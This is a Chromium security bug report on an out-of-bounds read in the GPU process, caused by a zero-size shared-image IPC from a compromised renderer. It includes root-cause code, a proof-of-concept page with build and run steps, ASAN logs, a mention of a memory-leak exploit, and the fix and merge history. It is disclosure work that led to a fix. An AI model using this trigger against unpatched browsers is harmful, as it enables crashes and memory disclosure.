# Out-of-Bounds Read in `GLTextureHolder::Initialize` via Zero-Size `CreateSharedImageWithData` IPC in GPU Process

| Field | Value |
|-------|-------|
| **Issue ID** | [488270257](https://issues.chromium.org/issues/488270257) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU>Internals |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | ky...@chromium.org |
| **Created** | 2026-02-27 |
| **Bounty** | $3,000.00 |

## Description

## Summary

A compromised renderer process can send a crafted `create_shared_image_with_data` Mojo message to the GPU process, setting `pixel_data_size` to zero and `pixel_data_offset` to exactly the size of a pre-registered shared memory region. The GPU process constructs an empty `base::span` whose `data()` pointer is non-null, pointing one-past-end of the mapping. This span bypasses all size validation in `GLCommonImageBackingFactory::CanCreateTexture` and is subsequently passed directly to `glTexImage2D` in `GLTextureHolder::Initialize`, which the GL driver interprets as a valid client-side pixel source and reads from unconditionally. The result is a heap-buffer-overflow OOB read in the GPU process, causing GPU process termination and WebGL context loss in the renderer. In memory layouts where the mapping is backed by a heap allocation, the GL driver reads from the heap redzone or adjacent freed memory; on platforms without ASAN, this out-of-bounds read may instead read live heap data from the GPU process, constituting a potential cross-process information disclosure from a sandboxed renderer.

The vulnerable code path in `GLTextureHolder::Initialize` is platform-agnostic and present on all desktop platforms that use the GL backend (Linux, ChromeOS). The specific trigger format `ALPHA_8` (`GL_ALPHA8_EXT`) reliably produces `supports_storage=false` on any GLES2 driver where `GL_ALPHA8_EXT` is not accepted as an immutable storage internal format, which includes Mesa Gallium drivers on Linux and ChromeOS. On Windows, Chromium uses ANGLE over D3D11 by default, where `ALPHA_8` may be remapped differently; behavior on that platform has not been verified. Confirmed affected configuration: Linux x86-64, Intel Arc A770 (PCI ID 8086:56a1), Mesa Iris Gallium driver (`iris_dri.so`, Mesa 23.x or later).

## Bisect

Introducing Commit: `8d678f89ac9bbc6f02c01842473ada033d8babdc`

- Date: 2018-12-11
- Author: Eric Karl [ericrk@chromium.org](mailto:ericrk@chromium.org)
- Review: <https://chromium-review.googlesource.com/c/1343346>

## Root Cause

The vulnerability arises from the interaction of three independent code paths that each appear locally correct but collectively admit a dangerous end-to-end condition.

The first component is `SharedImageStub::OnCreateSharedImageWithData`. The function validates the IPC parameters by computing `required_span_size = pixel_data_offset + pixel_data_size` using `base::CheckedNumeric` to catch overflow, which correctly rejects the case where the sum would exceed `size_t`. When `pixel_data_size` is zero and `pixel_data_offset` is exactly `N` (the size of the pre-registered mapping), the arithmetic yields `N + 0 = N`, which is a valid value. The call `GetMemoryAsSpan<uint8_t>(N)` returns a span of exactly `N` bytes, which is non-empty, so the emptiness guard at the next check passes. The subsequent `memory.subspan(N, 0)` call produces an empty span whose `data()` member is `base_address + N`, not `nullptr`. This is well-defined behavior for `base::span::subspan`, but it creates a span that is simultaneously empty (`size() == 0`) and has a non-null data pointer pointing one byte past the end of the mapping.

```
// gpu/ipc/service/shared_image_stub.cc:288-336
void SharedImageStub::OnCreateSharedImageWithData(
    mojom::CreateSharedImageWithDataParamsPtr params) {
  // ...
  base::CheckedNumeric<size_t> safe_required_span_size =
      params->pixel_data_offset;
  safe_required_span_size += params->pixel_data_size;
  size_t required_span_size;
  if (!safe_required_span_size.AssignIfValid(&required_span_size)) {
    // ... rejected on overflow only
  }

  auto memory =
      upload_memory_mapping_.GetMemoryAsSpan<uint8_t>(required_span_size);
  if (memory.empty()) {
    // ... rejected only when required_span_size > mapping size
  }

  // When pixel_data_offset=N and pixel_data_size=0:
  // memory is a N-byte span (non-empty, passes the guard above)
  // subspan(N, 0) => empty span, data() = base + N  (one-past-end, non-null)
  auto subspan =
      memory.subspan(params->pixel_data_offset, params->pixel_data_size);

  factory_->CreateSharedImage(..., subspan);  // subspan.empty()==true, subspan.data()!=nullptr
}

```

The second component is `GLCommonImageBackingFactory::CanCreateTexture`. The entire block that validates whether the supplied pixel data has the correct size for the given format and texture dimensions is wrapped in the condition `if (!pixel_data.empty())`. Because the crafted span is empty, this block is skipped entirely; no call to `GLES2Util::ComputeImageDataSizes` is made, and the discrepancy between the zero-byte span and the nonzero number of bytes that `glTexImage2D` will read is never detected.

```
// gpu/command_buffer/service/shared_image/gl_common_image_backing_factory.cc:201-273
bool GLCommonImageBackingFactory::CanCreateTexture(
    viz::SharedImageFormat format,
    const gfx::Size& size,
    base::span<const uint8_t> pixel_data,
    GLenum target) {
  // ... format and size checks ...

  // All pixel data size validation is gated on this condition.
  // An empty span bypasses every byte-count check below.
  if (!pixel_data.empty()) {
    // ... ComputeImageDataSizes, bytes_required validation ...
    if (pixel_data.size() != bytes_required) {
      return false;
    }
  }
  return true;
}

```

The third and decisive component is `GLTextureHolder::Initialize`. The function selects one of three branches depending on the backing format's properties. The first branch (`supports_storage == true`) allocates immutable storage with `glTexStorage2D` and only calls `glTexSubImage2D` inside `if (!pixel_data.empty())`, making it safe. The second branch handles compressed formats via `glCompressedTexImage2D` and passes `pixel_data.size()` as the data length, so passing zero bytes is harmless. The third branch, which handles the general uncompressed, non-storage case, unconditionally passes `pixel_data.data()` as the pixel source to `glTexImage2D`. There is no `if (!pixel_data.empty())` guard here. When the format is `ALPHA_8` (`GL_ALPHA8_EXT`), `supports_storage` is false because `GL_ALPHA8_EXT` is not a valid immutable internal format in GLES2 contexts, so this else branch is taken and `glTexImage2D` is called with the past-end pointer as its `pixels` argument.

```
// gpu/command_buffer/service/shared_image/gl_texture_holder.cc:169-213
  if (format_info.supports_storage) {
    // glTexStorage2D + guarded glTexSubImage2D — safe path
    api->glTexStorage2DEXTFn(...);
    if (!pixel_data.empty()) {          // <-- correctly guarded
      api->glTexSubImage2DFn(..., pixel_data.data());
    }
  } else if (format_info.is_compressed) {
    // passes pixel_data.size() as byte count — zero bytes, harmless
    api->glCompressedTexImage2DFn(..., pixel_data.size(), pixel_data.data());
  } else {
    // VULNERABLE: no empty() check; pixel_data.data() is non-null past-end pointer
    ScopedUnpackState scoped_unpack_state(!pixel_data.empty());
    api->glTexImage2DFn(
        format_desc_.target, 0, format_desc_.image_internal_format,
        size_.width(), size_.height(), 0,
        format_info.adjusted_format, format_desc_.data_type,
        pixel_data.data());            // <-- reads from base_address + N
  }

```

`ScopedUnpackState` constructed with `uploading_data = false` (since `pixel_data.empty()` is `true`) unbinds any `GL_PIXEL_UNPACK_BUFFER` that may be bound, but this does not prevent the GL driver from reading from the non-null client-side pointer. The OpenGL specification requires the driver to read `width * height * bytes_per_pixel` bytes from the pointer, and with a 1x1 `ALPHA_8` texture that is 1 byte. The driver therefore reads 1 byte from `base_address + N`, which is outside the shared memory mapping.

The `ScopedUnpackState(false)` does not create any safety guarantee in this scenario because the OpenGL specification treats a non-null `pixels` pointer unconditionally as a client-side data source when no PBO is bound, regardless of how the unpack state was configured.

## Reproduce

The vulnerability is in the GPU process and follows the compromised-renderer threat model. The PoC modifies `gpu/ipc/client/shared_image_interface_proxy.cc` to simulate a compromised renderer that sends the malformed IPC, then loads a minimal web page to trigger the SharedImage creation path.

Apply `patch.diff` against commit `fd0c865d5f83b3591c54505236133ba01d08c617` from the Chromium source root:

```
git apply patch.diff

```

Save the following as `poc.html` in the Chromium source root:

```
<!DOCTYPE html>
<html>
<head><title>GPU-032 PoC</title></head>
<body>
<canvas id="c" width="256" height="256"></canvas>
<script>
// Force GPU-accelerated compositing to trigger SharedImage allocation,
// which causes the injected renderer code to fire the crafted IPC.
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');
let frame = 0;
function draw() {
  ctx.fillStyle = 'hsl(' + (frame * 3) + ',100%,50%)';
  ctx.fillRect(0, 0, 256, 256);
  frame++;
  requestAnimationFrame(draw);
}
draw();
console.log('[POC] PoC loaded, waiting for GPU crash...');
</script>
</body>
</html>

```

Tested on: Linux x86-64, kernel 6.8, Intel Arc A770 (Mesa Iris, `iris_dri.so`), Chromium ASAN build at commit `fd0c865d5f83b3591c54505236133ba01d08c617`.

Build and run:

```
# Build ASAN chrome
autoninja -C /path/to/chromium/src/out/asan chrome

# Run with GPU process enabled (required to reach the vulnerable path),
# sandbox enabled (demonstrates IPC-based sandbox escape),
# and stderr logging captured
ASAN_OPTIONS=detect_odr_violation=0 \
  /path/to/chromium/src/out/asan/chrome \
  --user-data-dir=/tmp/poc-chromium \
  --enable-logging=stderr \
  file:///path/to/poc/poc.html \
  2>&1 | tee /tmp/poc-asan.txt

```

Actual output:

```
[299283:299283:0227/232800.916908:WARNING:chrome/browser/signin/account_consistency_mode_manager.cc:74] Desktop Identity Consistency cannot be enabled as no OAuth client ID and client secret have been configured.
libva error: /usr/lib/x86_64-linux-gnu/dri/iHD_drv_video.so init failed
libva error: /usr/lib/x86_64-linux-gnu/dri/i965_drv_video.so init failed
[299321:299321:0227/232801.760094:ERROR:media/gpu/vaapi/vaapi_wrapper.cc:1640] vaInitialize failed: unknown libva error
[299321:299321:0227/232801.778285:WARNING:sandbox/policy/linux/sandbox_linux.cc:405] InitializeSandbox() called with multiple threads in process gpu-process.
[299652:1:0227/232802.505230:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:148] POC: fired offset=1048576 size=0 format=ALPHA_8
[299321:299321:0227/232802.505771:ERROR:gpu/command_buffer/service/shared_image/gl_texture_holder.cc:171] INS: Initialize format=ALPHA_8 supports_storage=0 is_compressed=0 pixel_data.empty()=1 pixel_data.data()=0x741e5e158000 pixel_data.size()=0
[299321:299321:0227/232802.516908:ERROR:gpu/command_buffer/service/shared_image/gl_texture_holder.cc:171] INS: Initialize format=RGBA_8888 supports_storage=1 is_compressed=0 pixel_data.empty()=1 pixel_data.data()=0 pixel_data.size()=0
[299321:299321:0227/232802.537428:ERROR:gpu/command_buffer/service/shared_image/gl_texture_holder.cc:171] INS: Initialize format=RGBA_8888 supports_storage=1 is_compressed=0 pixel_data.empty()=1 pixel_data.data()=0 pixel_data.size()=0
[299321:299321:0227/232802.608479:ERROR:gpu/command_buffer/service/shared_image/gl_texture_holder.cc:171] INS: Initialize format=RGBA_8888 supports_storage=1 is_compressed=0 pixel_data.empty()=1 pixel_data.data()=0 pixel_data.size()=0
[299321:299321:0227/232802.617723:ERROR:gpu/command_buffer/service/shared_image/gl_texture_holder.cc:171] INS: Initialize format=RGBA_8888 supports_storage=1 is_compressed=0 pixel_data.empty()=1 pixel_data.data()=0 pixel_data.size()=0
[299321:299321:0227/232802.618603:ERROR:gpu/command_buffer/service/shared_image/gl_texture_holder.cc:171] INS: Initialize format=RGBA_8888 supports_storage=1 is_compressed=0 pixel_data.empty()=1 pixel_data.data()=0 pixel_data.size()=0
[299283:299319:0227/232802.679666:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:148] POC: fired offset=1048576 size=0 format=ALPHA_8
[299321:299321:0227/232802.680324:ERROR:gpu/command_buffer/service/shared_image/gl_texture_holder.cc:171] INS: Initialize format=ALPHA_8 supports_storage=0 is_compressed=0 pixel_data.empty()=1 pixel_data.data()=0x741e5e158000 pixel_data.size()=0
=================================================================
==299321==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x741e5e158000 at pc 0x582476f912f4 bp 0x7ffebf358bd0 sp 0x7ffebf358388
READ of size 1 at 0x741e5e158000 thread T0 (chrome)
    #0 0x582476f912f3 in memcpy (/path/to/chromium/src/out/asan/chrome+0x10d302f3) (BuildId: d314b470fd334c66)
    #1 0x741e6836be2c  (/usr/lib/x86_64-linux-gnu/dri/iris_dri.so+0x16be2c) (BuildId: 0c994a8f78bfdc6601a8c3a4e62f446a0ffce437)

0x741e5e158000 is located 6144 bytes before 160952-byte region [0x741e5e159800,0x741e5e180cb8)
freed by thread T0 (chrome) here:
    #0 0x582476f92086 in free (/path/to/chromium/src/out/asan/chrome+0x10d31086) (BuildId: d314b470fd334c66)
    #1 0x781e7723c883 in ZSTD_freeDCtx (/lib/x86_64-linux-gnu/libzstd.so.1+0x89883) (BuildId: 5d9d0d946a3154a748e87e17af9d14764519237b)

previously allocated by thread T0 (chrome) here:
    #0 0x582476f92324 in malloc (/path/to/chromium/src/out/asan/chrome+0x10d31324) (BuildId: d314b470fd334c66)
    #1 0x781e77238e88 in ZSTD_createDCtx_advanced (/lib/x86_64-linux-gnu/libzstd.so.1+0x85e88) (BuildId: 5d9d0d946a3154a748e87e17af9d14764519237b)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/path/to/chromium/src/out/asan/chrome+0x10d302f3) (BuildId: d314b470fd334c66) in memcpy
Shadow bytes around the buggy address:
  0x741e5e157d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x741e5e157e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x741e5e157e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x741e5e157f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x741e5e157f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x741e5e158000:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x741e5e158080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x741e5e158100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x741e5e158180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x741e5e158200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x741e5e158280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==299321==ADDITIONAL INFO

==299321==Note: Please include this section with the ASan report.
Task trace:
    #0 0x582481b332d2 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #1 0x582481b2e026 in gpu::Scheduler::TryScheduleSequence(gpu::Scheduler::Sequence*) gpu/command_buffer/service/scheduler.cc:432:29

Command line: `/proc/self/exe --type=gpu-process --ozone-platform=x11 --crashpad-handler-pid=299286 --enable-crash-reporter=, --user-data-dir=/tmp/poc-chromium --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAEAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,6352022960532226838,7078952649096486541,262144 --field-trial-handle=3,i,13414449080994677904,15710992600953954553,262144 --variations-seed-version --pseudonymization-salt-handle=7,i,10583718021982126193,16984710306321877747,4 --trace-process-track-uuid=3190708988185955192 --enable-logging=stderr`

==299321==END OF ADDITIONAL INFO

==299321==ABORTING
[299283:299283:0227/232804.379260:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=256
[299283:299283:0227/232804.379375:WARNING:content/browser/gpu/gpu_process_host.cc:1441] The GPU process has crashed 1 time(s)
[299283:299283:0227/232804.387994:INFO:CONSOLE:0] "WebGL: CONTEXT_LOST_WEBGL: loseContext: context lost", source: file:///path/to/chromium/src/poc.html (0)

```

The ASAN report confirms the crash occurs in the GPU process (PID 299321), not the renderer, at `gpu::Scheduler::RunNextTask`. The shadow byte `[fa]` at address `0x741e5e158000` indicates a heap left redzone, meaning the read lands immediately before an adjacent heap allocation. The `data()` pointer is exactly `mapping_base + 1048576`, and the mapping is 1 MB wide, so `0x741e5e158000` is the first byte past the mapped region. The call chain `iris_dri.so → memcpy` confirms that the Intel Mesa GL driver internally copies pixel data using `memcpy`, which is what ASAN intercepts.

## Credit

86ac1f1587b71893ed2ad792cd7dde32

## Attachments

- [patch.diff](attachments/patch.diff) (text/x-diff, 2.7 KB)
- [poc.html](attachments/poc.html) (text/html, 608 B)
- [asan.log](attachments/asan.log) (text/plain, 13.7 KB)
- [exploit.patch](attachments/exploit.patch) (text/x-diff, 10.1 KB)
- [exp.html](attachments/exp.html) (text/html, 1.5 KB)
- [leak.txt](attachments/leak.txt) (text/plain, 4.2 KB)

## Timeline

### aj...@google.com (2026-02-28)

Thanks this reproduces with the patch applied.

`run-chrome-asan --no-first-run --disable-extensions --no-sandbox --enable-logging --log-file=d:\temp\asan.log D:\pocs\stella-488270257\poc.html`

```
[11824:15780:0227/174518.485:ERROR:gpu\ipc\client\shared_image_interface_proxy.cc:138] POC: fired offset=1048576 size=0 format=ALPHA_8
=================================================================
==42980==ERROR: AddressSanitizer: access-violation on unknown address 0x016697aa0000 (pc 0x7ffb09d9dc14 bp 0x002804bfcf20 sp 0x002804bfce98 T0)
==42980==The signal is caused by a READ memory access.
[41484:29616:0227/174518.689:INFO:CONSOLE:19] "[POC] PoC loaded, waiting for GPU crash...", source: file:///D:/pocs/stella-488270257/poc.html (19)
[41484:23184:0227/174518.801:ERROR:gpu\ipc\client\shared_image_interface_proxy.cc:138] POC: fired offset=1048576 size=0 format=ALPHA_8
    #0 0x7ffb09d9dc13  (C:\WINDOWS\System32\ucrtbase.dll+0x1800edc13)
    #1 0x7ffab577b532  (d:\chromium\src\out\Asan\clang_rt.asan_dynamic-x86_64.dll+0x18004b532)
    #2 0x7ffa98f55754 in angle::LoadToNative<unsigned char, 1>(struct angle::ImageLoadContext const &, unsigned __int64, unsigned __int64, unsigned __int64, unsigned char const *, unsigned __int64, unsigned __int64, unsigned char *, unsigned __int64, unsigned __int64) D:\chromium\src\third_party\angle\src\image_util\loadimage.inc:67:17
    #3 0x7ffa996bc482 in rx::Image11::loadData(class gl::Context const *, struct gl::Box const &, struct gl::PixelUnpackState const &, unsigned int, void const *, bool) D:\chromium\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Image11.cpp:308:5
    #4 0x7ffa99850ce6 in rx::TextureD3D::setImageImpl(class gl::Context const *, class gl::ImageIndex const &, unsigned int, struct gl::PixelUnpackState const &, class gl::Buffer *, unsigned char const *, __int64) D:\chromium\src\third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp:344:30
    #5 0x7ffa9985a6d4 in rx::TextureD3D_2D::setImage(class gl::Context const *, class gl::ImageIndex const &, unsigned int, struct angle::Extents<int> const &, unsigned int, unsigned
...
==42980==ADDITIONAL INFO

==42980==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7ff9be8c66a9 in gpu::Scheduler::TryScheduleSequence(class gpu::Scheduler::Sequence *) D:\chromium\src\gpu\command_buffer\service\scheduler.cc:432:29


Command line: `"d:\chromium\src\out\Asan\chrome.exe" --type=gpu-process --no-sandbox --user-data-dir="d:\temp\asan-profile" --no-pre-read-main-dll --start-stack-profiler --gpu-preferences=SAAAAAAAAADgAQAEAAAAAAAAAAAAAMAAAwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --metrics-shmem-handle=1892,i,5603226250008142064,2822447823607846194,262144 --field-trial-handle=1840,i,8460460938318717578,16661695709144155493,262144 --variations-seed-version --pseudonymization-salt-handle=1864,i,3353038718559057519,2382656810352409516,4 --trace-process-track-uuid=3190708988185955192 --enable-logging=handle --log-file=2056 --mojo-platform-channel-handle=1836 /prefetch:2`

==42980==END OF ADDITIONAL INFO

==42980==ABORTING

```

As a note - your poc also "triggers" in the browser process so it's helpful to wrap it in something like this:

```
#include "base/command_line.h"
bool IsRenderer() {
  base::CommandLine* cmd = base::CommandLine::ForCurrentProcess();
  if (cmd->HasSwitch("type") && cmd->GetSwitchValueASCII("type") == "renderer") {
    return true;
  }
  return false;
}

```

If I add that the bug still reproduces, so, nice!

### aj...@google.com (2026-02-28)

setting sev=High as this gpu process bug requires a compromised renderer.

### se...@gmail.com (2026-02-28)

Thanks for the reminder for `IsRenderer`! I missed this point earlier. I've also written an exploit to leak GPU process memory through the oob-read. The test output is in `leak.txt`.

```
git apply exploit.patch
ninja -C out/release/ chrome
./out/release/chrome --user-data-dir=./user exp.html 

```

### ch...@google.com (2026-02-28)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-28)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### ky...@chromium.org (2026-03-02)

Based on a quick read through this looks like a real bug with a trivial fix.

SharedImageStub::OnCreateSharedImageWithData() can reject incoming pixel data with size zero as it doesn't make much sense. Even better we can verify that size of the data is at least the minimum pixel\_data\_size aka `pixel_data_size >= height * min_row_bytes`. We already CHECK this on the client side but with a compromised renderer you can avoid that.

With <https://crbug.com/485286876> we could verify that size is at least `pixel_data_size >= (height - 1) * row_bytes + min_row_bytes` which would be better still.

### dx...@google.com (2026-03-02)

Project: chromium/src  

Branch:  main  

Author:  kylechar [kylechar@chromium.org](mailto:kylechar@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7623536>

Verify shared image pixel size

---


Expand for full commit details
```
     
    Ensure that pixel data size makes sense based on the format+size of the 
    shared image in SharedImageStub. 
     
    Bug: 488270257 
    Change-Id: Ic98123443c047ec605274212e53ee278fdcc264c 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7623536 
    Reviewed-by: Vasiliy Telezhnikov <vasilyt@chromium.org> 
    Commit-Queue: Kyle Charbonneau <kylechar@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1592603}

```

---

Files:

- M `gpu/ipc/service/shared_image_stub.cc`

---

Hash: [6345b520b1887709d3f21260a54c916b297453db](https://chromiumdash.appspot.com/commit/6345b520b1887709d3f21260a54c916b297453db)  

Date: Mon Mar 2 19:20:05 2026


---

### ch...@google.com (2026-03-11)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### dx...@google.com (2026-03-12)

Project: chromium/src  

Branch:  main  

Author:  kylechar [kylechar@chromium.org](mailto:kylechar@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7653308>

Harden shared image pixel spans

---


Expand for full commit details
```
     
    Ensure that span data pointer is never used when the span is empty. This 
    guards against zero sized span with non-null pointer. 
     
    Bug: 488270257 
    Change-Id: I952ed3f9dfb9866e2a79d341f3cfc186e542e4a5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7653308 
    Reviewed-by: Vasiliy Telezhnikov <vasilyt@chromium.org> 
    Commit-Queue: Kyle Charbonneau <kylechar@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1598647}

```

---

Files:

- M `gpu/command_buffer/service/shared_image/egl_image_backing.cc`
- M `gpu/command_buffer/service/shared_image/gl_texture_holder.cc`

---

Hash: [f5c4ada13b2fb7b75db194639f346d8ea082e185](https://chromiumdash.appspot.com/commit/f5c4ada13b2fb7b75db194639f346d8ea082e185)  

Date: Thu Mar 12 20:32:57 2026


---

### ch...@google.com (2026-03-12)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-03-14)

Security Merge Request Consideration: Requesting merge to stable (M146) because latest trunk commit (1598647) appears to be after stable branch point (1582197).
Security Merge Request Consideration: Requesting merge to beta (M147) because latest trunk commit (1598647) appears to be after beta branch point (1596535).
Security Merge Request - Manual Review: Merge review required: M146 is already shipping to stable.

**Merge approved:** your change passed merge requirements and is auto-approved for M147. Please go ahead and merge the CL to branch 7727 (refs/branch-heads/7727) manually. Please contact milestone owner if you have questions.
Merge instructions: <https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md>
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [146, 147].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### dr...@chromium.org (2026-03-15)

<https://crrev.com/c/7623536> is already in M147, so removing that request. We've had plenty of bake time at this point, so approved to merge to M146.

### dx...@google.com (2026-03-17)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  kylechar [kylechar@chromium.org](mailto:kylechar@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7676377>

[M146] Verify shared image pixel size

---


Expand for full commit details
```
     
    Ensure that pixel data size makes sense based on the format+size of the 
    shared image in SharedImageStub. 
     
    (cherry picked from commit 6345b520b1887709d3f21260a54c916b297453db) 
     
    Bug: 488270257 
    Change-Id: Ic98123443c047ec605274212e53ee278fdcc264c 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7623536 
    Reviewed-by: Vasiliy Telezhnikov <vasilyt@chromium.org> 
    Commit-Queue: Kyle Charbonneau <kylechar@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1592603} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7676377 
    Cr-Commit-Position: refs/branch-heads/7680@{#2754} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `gpu/ipc/service/shared_image_stub.cc`

---

Hash: [2ff7dcf4371459d1a8cb20207ab0ed0b0d69b13a](https://chromiumdash.appspot.com/commit/2ff7dcf4371459d1a8cb20207ab0ed0b0d69b13a)  

Date: Tue Mar 17 22:34:58 2026


---

### pe...@google.com (2026-03-17)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2026-03-23)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-23)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7692274
2. Low - There was no conflict.
3. 146
4. Yes, the issue has existed since 2018 according to the bug description.

### sp...@google.com (2026-03-31)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Baseline with bisect. User information disclosure


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### an...@google.com (2026-03-31)

Merge approved for LTS-138

### dx...@google.com (2026-04-02)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  kylechar [kylechar@chromium.org](mailto:kylechar@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7692274>

[M138-LTS] Verify shared image pixel size

---


Expand for full commit details
```
     
    Ensure that pixel data size makes sense based on the format+size of the 
    shared image in SharedImageStub. 
     
    (cherry picked from commit 6345b520b1887709d3f21260a54c916b297453db) 
     
    Bug: 488270257 
    Change-Id: Ic98123443c047ec605274212e53ee278fdcc264c 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7623536 
    Reviewed-by: Vasiliy Telezhnikov <vasilyt@chromium.org> 
    Commit-Queue: Kyle Charbonneau <kylechar@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1592603} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7692274 
